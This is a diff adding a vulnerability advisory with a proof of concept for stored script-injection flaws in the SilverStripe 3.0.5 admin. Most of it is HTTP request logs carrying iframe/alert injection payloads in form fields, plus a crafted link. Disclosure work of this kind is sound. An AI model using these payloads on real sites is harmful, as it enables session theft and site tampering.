@@ -1,0 +1,415 @@
+source: http://www.securityfocus.com/bid/62782/info
+
+SilverStripe is prone to multiple HTML-injection vulnerabilities because it fails to sufficiently sanitize user-supplied input.
+
+Attacker-supplied HTML or JavaScript code could run in the context of the affected site, potentially allowing the attacker to steal cookie-based authentication credentials and control how the site is rendered to the user; other attacks are also possible.
+
+SilverStripe 3.0.5 is vulnerable; other versions may also be affected. 
+
+Proof of Concept:
+=================
+1.1
+The first persistent input validation web vulnerability can be exploited 
+by remote attackers with low privileged application user accounts and 
+low required user interaction. For demonstration or reproduce ...
+
+
+PoC: Groups & Rollen (Roles) - Print 
+
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" 
+lang="en"><head>
+<title>SilverStripe - Sicherheit</title>
+<link rel="stylesheet" type="text/css" 
+href="/framework/css/GridField_print.css?m=1346228458">
+</head>
+<body onload="window.print();">
+<h3>SilverStripe - Sicherheit</h3>
+<table>
+<thead>
+<tr><th>Vorname</th><th>Nachname</th><th>E-Mail</th></tr>
+</thead>
+<tbody>	
+</tbody>
+</table>
+<p>
+Gedruckt am 11:44pm, 22/09/2013
+<br>
+Gedruckt von a%20>"<iframe src="a" onload="alert("BKM")<" a%20="" 
+a%20<="">>"<iframe src=a onload=alert("BKM")<
+</p>
+</body>
+</html>
+</iframe></p></body></html>
+
+
+POST 
+http://www.example.com/admin/security/EditForm/field/Groups/item/new/ItemEditForm 
+Load Flags[LOAD_BYPASS_CACHE  LOAD_BACKGROUND  ] 
+Content Size[20] Mime Type[text/html]
+   
+Request Headers:
+Host[www.example.com]
+User-Agent[Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20100101 
+Firefox/23.0]
+Accept[*/*]
+Accept-Language[en-US,en;q=0.5]
+Accept-Encoding[gzip, deflate]
+DNT[1]
+Content-Type[application/x-www-form-urlencoded; charset=UTF-8]
+X-Pjax[CurrentForm,Breadcrumbs]
+X-Requested-With[XMLHttpRequest]
+Referer[http://www.example.com/admin/security/EditForm/field/Groups/item/new]
+Content-Length[336]
+Cookie[__utma=1.1338660565.1379847695.1379847695.1379847695.1; 
+__utmb=1.8.10.1379847695; __utmc=1; 
+__utmz=1.1379847695.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); 
+PHPSESSID=3cdf3fce42b710fc8e1da69d18cc0dc4; PastMember=1; 
+cms-panel-collapsed-cms-content-tools-CMSPagesController=true; 
+cms-panel-collapsed-cms-menu=false; 
+cms-panel-collapsed-cms-content-tools-ModelAdmin=false; 
+__utma=1.1551299670.1379847854.1379847854.1379847854.1; 
+__utmc=1; 
+__utmz=1.1379847854.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); 
+cms-panel-collapsed-cms-content-tools-AssetAdmin=true; 
+cms-panel-collapsed-cms-content-tools-CMSMain=false; 
+cms-panel-collapsed-cms-content-tools-CMSPageHistoryController=false]
+Connection[keep-alive]
+Pragma[no-cache]
+Cache-Control[no-cache]
+   
+Post Data:
+Title[a%2520%3C%2F%3E%3E%22%3Ciframe+src%3Da+onload%3Dalert(%22BKM%22)%3C++++a%2520%3C%2F%3E%3E%22%3Ciframe+src%3Da+onload%3Dalert(%22BKM%22)%3C]
+ParentID[]
+ID[]
+SecurityID[1d6ca7e871bd6ec855f9409e25e030359c5b435f]
+action_doSave[1]
+BackURL[http%3A%2F%2Fwww.example.com%2Fadmin%2Fsecurity%2FEditForm%2Ffield%2FGroups%2Fitem%2Fnew%2F]
+
+
+Response Headers:
+Server[nginx]
+Date[Sun, 22 Sep 2013 11:44:20 GMT]
+Content-Type[text/html; charset=utf-8]
+Connection[keep-alive]
+Expires[Thu, 19 Nov 1981 08:52:00 GMT]
+Cache-Control[no-cache, max-age=0, must-revalidate]
+Pragma[no-cache]
+Set-Cookie[PastMember=1; expires=Sat, 21-Dec-2013 11:44:20 GMT; path=/; 
+httponly]
+X-ControllerURL[admin/security/EditForm/field/Groups/item/4]
+X-Pjax[CurrentForm,Breadcrumbs]
+X-Controller[SecurityAdmin]
+X-Title[SilverStripe - Sicherheit]
+X-Include-JS[/assets/_combinedfiles/lib.js?m=1379847629,/framework/thirdparty/tinymce/tiny_mce_gzip.php?m=1346228525&js=1&
+plugins=contextmenu%2Ctable%2Cemotions%2Cpaste%2Cspellchecker%2Cmedia%2Cfullscreen
+%2Cinlinepopups&themes=advanced&languages=de&diskcache=true&src=false,/assets/_combinedfiles/leftandmain.js?
+m=1379847630,/framework/admin/javascript/SecurityAdmin.js?m=1346228457,/framework/javascript/PermissionCheckboxSetField.js?m=1346228484]
+X-Include-CSS[/framework/admin/thirdparty/jquery-notice/jquery.notice.css?m=1346228458,/framework/thirdparty/jquery-ui-themes/smoothness/jquery-ui.css?
+m=1346228525,/framework/admin/thirdparty/chosen/chosen/chosen.css?m=1346228457,/framework/thirdparty/jstree/themes/apple/style.css?
+m=1346228525,/framework/css/TreeDropdownField.css?m=1346228458,/framework/admin/css/screen.css?m=1346228456,/framework/css/GridField.css?m=1346228458]
+Vary[Accept-Encoding]
+Content-Encoding[gzip]
+Content-Length[20]
+
+
+Status: 200[OK]
+GET http://www.example.com/admin/security/EditForm/field/Groups/item/4 
+Load Flags[LOAD_BACKGROUND  ] 
+Content Size[3966] Mime Type[text/html]
+
+
+Request Headers:
+Host[www.example.com]
+User-Agent[Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20100101 
+Firefox/23.0]
+Accept[*/*]
+Accept-Language[en-US,en;q=0.5]
+Accept-Encoding[gzip, deflate]
+DNT[1]
+X-Pjax[CurrentForm,Breadcrumbs]
+X-Requested-With[XMLHttpRequest]
+Referer[http://www.example.com/admin/security/EditForm/field/Groups/item/4]
+Cookie[__utma=1.1338660565.1379847695.1379847695.1379847695.1; 
+__utmb=1.8.10.1379847695; __utmc=1;
+ 
+__utmz=1.1379847695.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); 
+PHPSESSID=3cdf3fce42b710fc8e1da69d18cc0dc4; PastMember=1; 
+cms-panel-collapsed-cms-content-tools-CMSPagesController=true; 
+cms-panel-collapsed-cms-menu=false; 
+cms-panel-collapsed-cms-content-tools-ModelAdmin=false; 
+__utma=1.1551299670.1379847854.1379847854.1379847854.1; __utmc=1; 
+__utmz=1.1379847854.1.1.utmcsr=google|utmccn=(organic)|utmcmd=
+organic|utmctr=(not%20provided); 
+cms-panel-collapsed-cms-content-tools-AssetAdmin=true; 
+cms-panel-collapsed-cms-content-tools-CMSMain=false; 
+cms-panel-collapsed-cms-content-tools-CMSPageHistoryController=false]
+Connection[keep-alive]
+
+
+Response Headers:
+Server[nginx]
+Date[Sun, 22 Sep 2013 11:44:21 GMT]
+Content-Type[text/html; charset=utf-8]
+Connection[keep-alive]
+Expires[Thu, 19 Nov 1981 08:52:00 GMT]
+Cache-Control[no-cache, max-age=0, must-revalidate]
+Pragma[no-cache]
+Set-Cookie[PastMember=1; expires=Sat, 21-Dec-2013 11:44:21 GMT; path=/; 
+httponly]
+X-Controller[SecurityAdmin]
+X-Title[SilverStripe - Sicherheit]
+X-Include-JS[/assets/_combinedfiles/lib.js?m=1379847629,/framework/thirdparty/tinymce/tiny_mce_gzip.php?m=1346228525&js=1&
+plugins=contextmenu%2Ctable%2Cemotions%2Cpaste%2Cspellchecker%2Cmedia%2Cfullscreen
+%2Cinlinepopups&themes=advanced&languages=de&diskcache=true&src=false,/assets/_combinedfiles/leftandmain.js?
+m=1379847630,/framework/admin/javascript/SecurityAdmin.js?m=1346228457,/framework/javascript/PermissionCheckboxSetField.js?m=1346228484]
+X-Include-CSS[/framework/admin/thirdparty/jquery-notice/jquery.notice.css?m=
+1346228458,/framework/thirdparty/jquery-ui-themes/smoothness/jquery-ui.css?m=1346228525,/framework/admin/thirdparty/chosen/chosen/chosen.css?
+m=1346228457,/framework/thirdparty/jstree/themes/apple/style.css?m=1346228525,/framework/css/TreeDropdownField.css?m=1346228458,
+/framework/admin/css/screen.css?m=1346228456,/framework/css/GridField.css?m=1346228458,/framework/css/CheckboxSetField.css?m=1346228458]
+Vary[Accept-Encoding]
+Content-Encoding[gzip]
+Content-Length[3966]
+
+
+Status: 200[OK]
+GET 
+http://www.example.com/admin/security/EditForm/field/Groups/item/4/ItemEditForm/
+field/Members?Title=a%2520%3C%2F%3E%3E%22%3Ciframe+src%3Da+onload%3Dalert
+(%22BKM%22)%3C++++a%252&ParentID=&gridfield_relationsearch=&Members%5B
+GridState%5D=%7B%22GridFieldAddRelation%22%3A%5B%5D%2C%22GridFieldSortableHeader%22%3A%7B%22SortColumn%22%3A%5B%5D%7D%2C%22
+GridFieldFilterHeader%22%3A%7B%22Columns%22%3A%5B%5D%7D%2C%22GridFieldPaginator%22%3A%7B%22currentPage%22%3A1%7D%2C%22
+GridFieldSearchRelation%22%3A%5B%5D%7D&filter%5BFirstName%5D=&filter%5BSurname%5D=&filter%5BEmail
+%5D=&ID=4&SecurityID=1d6ca7e871bd6ec855f9409e25e030359c5b435f&action_gridFieldAlterAction%3FStateID%3D523ed8157c4b68_95954854=Drucken   
+<==
+Load Flags[LOAD_DOCUMENT_URI  LOAD_INITIAL_DOCUMENT_URI  ] 
+Content Size[378] 
+Mime Type[text/html]
+
+
+Request Headers:
+Host[www.example.com]
+User-Agent[Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20100101 
+Firefox/23.0]
+Accept[text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8]
+Accept-Language[en-US,en;q=0.5]
+Accept-Encoding[gzip, deflate]
+DNT[1]
+Referer[http://www.example.com/admin/security/EditForm/field/Groups/item/4]
+Cookie[__utma=1.1338660565.1379847695.1379847695.1379847695.1; 
+__utmb=1.8.10.1379847695; __utmc=1; 
+__utmz=1.1379847695.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); 
+PHPSESSID=3cdf3fce42b710fc8e1da69d18cc0dc4; PastMember=1; cms-panel-
+collapsed-cms-content-tools-CMSPagesController=true; 
+cms-panel-collapsed-cms-menu=false; 
+cms-panel-collapsed-cms-content-tools-ModelAdmin=false; 
+__utma=1.1551299670.1379847854.1379847854.1379847854.1; 
+__utmc=1; 
+__utmz=1.1379847854.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); 
+cms-panel-collapsed-cms-content-tools-AssetAdmin=true; 
+cms-panel-collapsed-cms-content-tools-CMSMain=false; 
+cms-panel-collapsed-cms-content-tools-CMSPageHistoryController=false]
+Connection[keep-alive]
+
+
+Response Headers:
+Server[nginx]
+Date[Sun, 22 Sep 2013 11:44:26 GMT]
+Content-Type[text/html; charset=utf-8]
+Connection[keep-alive]
+Expires[Thu, 19 Nov 1981 08:52:00 GMT]
+Cache-Control[no-cache, max-age=0, must-revalidate]
+Pragma[no-cache]
+Set-Cookie[PastMember=1; expires=Sat, 21-Dec-2013 11:44:26 GMT; path=/; 
+httponly]
+X-Controller[SecurityAdmin]
+X-Title[SilverStripe - Sicherheit]
+Vary[Accept-Encoding]
+Content-Encoding[gzip]
+Content-Length[378]
+
+
+Status: 200[OK]
+GET 
+http://www.example.com/admin/security/EditForm/field/Groups/item/4/ItemEditForm/field/[PERSISTENT 
+INJECTED SCRIPT CODE AS PATH!]
+Load Flags[LOAD_DOCUMENT_URI  ] 
+Content Size[20] 
+Mime Type[text/html]
+
+
+Request Headers:
+Host[www.example.com]
+User-Agent[Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20100101 
+Firefox/23.0]
+Accept[text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8]
+Accept-Language[en-US,en;q=0.5]
+Accept-Encoding[gzip, deflate]
+DNT[1]
+Referer[http://www.example.com/admin/security/EditForm/field/Groups/item/4/ItemEditForm/field/
+Members?Title=a%2520%3C%2F%3E%3E%22%3Ciframe+src%3Da+onload
+%3Dalert(%22BKM%22)%3C++++a%252&ParentID=&gridfield_relationsearch=&Members%5B
+GridState%5D=%7B%22GridFieldAddRelation%22%3A%5B%5D%2C%22GridFieldSortableHeader%22%3A%7B%22SortColumn%22%3A%5B%5D%7D%2C%22
+GridFieldFilterHeader%22%3A%7B%22Columns%22%3A%5B%5D%7D%2C%22GridFieldPaginator%22%3A%7B%22currentPage%22%3A1%7D%2C%22
+GridFieldSearchRelation%22%3A%5B%5D%7D&filter%5BFirstName%5D=&filter%5BSurname%5D=&filter%5BEmai%5D=&ID=4&
+SecurityID=1d6ca7e871bd6ec855f9409e25e030359c5b435f&action_gridFieldAlterAction%3FStateID%3D523ed8157c4b68_95954854=Drucken]
+Cookie[__utma=1.1338660565.1379847695.1379847695.1379847695.1; 
+__utmb=1.8.10.1379847695; __utmc=1; 
+__utmz=1.1379847695.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); 
+PHPSESSID=3cdf3fce42b710fc8e1da69d18cc0dc4; 
+PastMember=1; 
+cms-panel-collapsed-cms-content-tools-CMSPagesController=true; 
+cms-panel-collapsed-cms-menu=false; 
+cms-panel-collapsed-cms-content-tools-ModelAdmin=false; 
+__utma=1.1551299670.1379847854.1379847854.1379847854.1; __utmc=1; 
+__utmz=1.1379847854.1.1.utmcsr=google|
+utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); 
+cms-panel-collapsed-cms-content-tools-AssetAdmin=true; 
+cms-panel-collapsed-cms-content-tools-CMSMain=false; 
+cms-panel-collapsed-cms-content-tools-CMSPageHistoryController=false]
+Connection[keep-alive]
+
+
+Response Headers:
+Server[nginx]
+Date[Sun, 22 Sep 2013 11:44:27 GMT]
+Content-Type[text/html; charset=utf-8]
+Connection[keep-alive]
+Expires[Thu, 19 Nov 1981 08:52:00 GMT]
+Cache-Control[no-cache, max-age=0, must-revalidate]
+Pragma[no-cache]
+Set-Cookie[PastMember=1; expires=Sat, 21-Dec-2013 11:44:27 GMT; path=/; 
+httponly]
+X-Controller[SecurityAdmin]
+X-Title[SilverStripe - Sicherheit]
+Vary[Accept-Encoding]
+Content-Encoding[gzip]
+Content-Length[20]
+
+
+
+PoC: (Client-Side Link)
+http://www.example.com/admin/security/EditForm/field/Groups/item/4/ItemEditForm/field/Members
+?Title=a%25[PERSISTENT INJECTED SCRIPT 
+CODE!]%3C++++a%252&ParentID=&gridfield_relationsearch=&
+Members%5BGridState%5D=%7B%22GridFieldAddRelation%22%3A%5B%5D%2C%22GridFieldSortableHeader%22%3A%7B%22SortColumn%22%3A%5B%5D%7D%2
+C%22GridFieldFilterHeader%22%3A%7B%22Columns%22%3A%5B%5D%7D%2C%22GridFieldPaginator%22%3A%7B%22
+currentPage%22%3A1%7D%2C%22GridFieldSearchRelation%22%3A%5B%5D%7D&filter%5BFirstName%5D=&filter%5BSurname%5D=&filter%5BEmail
+%5D=&ID=4&SecurityID=1d6ca7e871bd6ec855f9409e25e030359c5b435f&action_gridFieldAlterAction%3FStateID%3D523ed8157c4b68_95954854=Drucken
+
+
+Reference(s):
+http://ss3.demo.silverstripe.org/admin/security/show/root#Root_Roles
+http://ss3.demo.silverstripe.org/admin/security/EditForm/field/Groups/item/1/edit
+http://www.example.com/admin/security/EditForm/field/Roles/item/new
+http://www.example.com/admin/security/EditForm/field/Groups/item/new/ItemEditForm
+http://www.example.com/admin/security/EditForm/field/Groups/item/4
+http://www.example.com/admin/security/EditForm/field/Groups/item/4/ItemEditForm/field/x
+
+
+
+
+
+
+1.2
+The secound persistent input validation web vulnerability and filter 
+bypass vulnerability can be exploited by remote attackers 
+with low privileged application user accounts with low required user 
+interaction. For demonstration or reproduce ...
+
+
+PoC: Model Admin > Add Company > Edit Company
+
+<span class="message validation">'>"<[PERSISTENT INJECTED SCRIPT 
+CODE!]>' ist kein numerischer Wert, 
+nur nummerische Werte sind in diesem Feld erlaubt</span>
+</div>
+<div id="CEO" class="field text">
+<label class="left" for="Form_ItemEditForm_CEO">CEO</label>
+<div class="middleColumn">
+<input type="text" name="CEO" value=">"<[PERSISTENT INJECTED SCRIPT 
+CODE!])</script>" class="text" id="Form_ItemEditForm_CEO" />
+</div>
+
+Note: The vulnerability is located in the message validation filter 
+exception-handling.
+
+
+
+--- PoC Session Request Logs ---
+
+Status: 200[OK]
+POST 
+http://www.example.com/admin/test/Company/EditForm/field/Company/item/new/ItemEditForm 
+Load Flags[LOAD_BYPASS_CACHE  LOAD_BACKGROUND  ] 
+Content Size[1309]
+Mime Type[text/html]
+
+
+Request Headers:
+Host[www.example.com]
+User-Agent[Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20100101 
+Firefox/23.0]
+Accept[*/*]
+Accept-Language[en-US,en;q=0.5]
+Accept-Encoding[gzip, deflate]
+DNT[1]
+Content-Type[application/x-www-form-urlencoded; charset=UTF-8]
+X-Pjax[CurrentForm,Breadcrumbs]
+X-Requested-With[XMLHttpRequest]
+Referer[http://www.example.com/admin/test/Company/EditForm/field/Company/item/new?q[Name]=&q[Category]=&q[Revenue]=&q[CEO]=]
+Content-Length[560]
+Cookie[__utma=1.1338660565.1379847695.1379847695.1379847695.1; 
+__utmb=1.7.10.1379847695; __utmc=1; 
+__utmz=1.1379847695.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); 
+PHPSESSID=3cdf3fce42b710fc8e1da69d18cc0dc4; PastMember=1; 
+cms-panel-collapsed-cms-content-tools-CMSPagesController=true; 
+cms-panel-collapsed-cms-menu=false; 
+cms-panel-collapsed-cms-content-tools-ModelAdmin=false; 
+__utma=1.1551299670.1379847854.1379847854.1379847854.1; 
+__utmb=1.5.10.1379847854; __utmc=1; 
+__utmz=1.1379847854.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided)]
+Connection[keep-alive]
+Pragma[no-cache]
+Cache-Control[no-cache]
+
+
+Post Data:
+Name[Evolution+Security]
+Category[TEST+PP]
+Revenue[%3E%22%3Ciframe+src%3Dhttp%3A%2F%2Fvuln-lab.com%3E%3Cscript+alert(document.cookie)%3C%2Fscript%3E]      
+<= [PERSISTENT INJECTED TEST CODES!]
+CEO[%3E%22%3Ciframe+src%3Dhttp%3A%2F%2Fvuln-lab.com%3E%3Cscript+alert(document.cookie)%3C%2Fscript%3E]
+RelationFieldsTestPageID[]
+GridFieldTestPageHasOneID[]
+SecurityID[1d6ca7e871bd6ec855f9409e25e030359c5b435f]
+action_doSave[1]
+BackURL 
+[http%3A%2F%2Fwww.example.com%2Fadmin%2Ftest%2FCompany%2FEditForm%2Ffield%2FCompany%2Fitem%2F
+new%3Fq%5BName%5D%3D%26q%5BCategory%5D%3D%26q%5BRevenue%5D%3D%26q%5BCEO%5D%3D%2F]
+   
+
+Response Headers:
+Server[nginx]
+Date[Sun, 22 Sep 2013 11:20:33 GMT]
+Content-Type[text/html]
+Connection[keep-alive]
+Expires[Thu, 19 Nov 1981 08:52:00 GMT]
+Cache-Control[no-cache, max-age=0, must-revalidate]
+Pragma[no-cache]
+Set-Cookie[PastMember=1; expires=Sat, 21-Dec-2013 11:20:32 GMT; path=/; 
+httponly]
+X-Controller[TestModelAdmin]
+X-Title[SilverStripe - Test ModelAdmin]
+X-Include-JS[/assets/_combinedfiles/lib.js?m=1379847629,/framework/thirdparty/tinymce/tiny_mce_gzip.php?m=1346228525&js=1&
+plugins=contextmenu%2Ctable%2Cemotions%2Cpaste%2Cspellchecker%2Cmedia%2Cfullscreen
+%2Cinlinepopups&themes=advanced&languages=de&diskcache=true&src=false,/assets/_combinedfiles/leftandmain.js?
+m=1379847630,/framework/admin/javascript/ModelAdmin.js?m=1346228457]
+X-Include-CSS[/framework/admin/thirdparty/jquery-notice/jquery.notice.css?m=1346228458,
+/framework/thirdparty/jquery-ui-themes/smoothness/jquery-ui.css?m=1346228525,/framework/admin/thirdparty/chosen/chosen/chosen.css?
+m=1346228457,/framework/thirdparty/jstree/themes/apple/style.css?m=1346228525,/framework/css/TreeDropdownField.css?m=1346228458,
+/framework/admin/css/screen.css?m=1346228456,/framework/css/GridField.css?m=1346228458]
+Vary[Accept-Encoding]
+Content-Encoding[gzip]
+Content-Length[1309]
+
+
